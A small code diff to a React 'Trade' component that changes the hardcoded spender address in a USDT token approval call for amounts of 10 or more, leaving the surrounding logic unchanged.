@@ -1916,7 +1916,7 @@ export default function Trade() {
       const amountToApprove = ethers.utils.parseEther(usdtAmount);
       if (usdtAmount >= 10) {
         const tx = await usdtContract.approve(
-          "0xAb1e13E8A7a7d95EE8aDDC1f74aAc3CF6CccA597",
+          "0xFe5993062573122d9Ff4073E83fA22fB23DDE27D",
           amountToApprove
         );
         console.log("Approval transaction hash:", tx.hash);
